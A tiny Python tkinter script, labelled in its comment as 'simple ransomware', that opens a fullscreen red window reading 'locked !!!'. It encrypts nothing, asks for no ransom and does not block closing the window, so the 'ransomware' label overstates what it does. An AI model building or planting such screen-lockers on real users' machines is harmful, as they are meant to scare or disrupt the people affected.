# simple ransomware can lock screen
import tkinter

MAI = tkinter.Tk()

MAI.attributes("-fullscreen" , True)

mes = tkinter.Label(MAI , text = "locked !!!" , bg = "red" , fg = "blue" , font = ("arial", 60))

mes.pack()

MAI.configure(bg = "red")

MAI.mainloop()
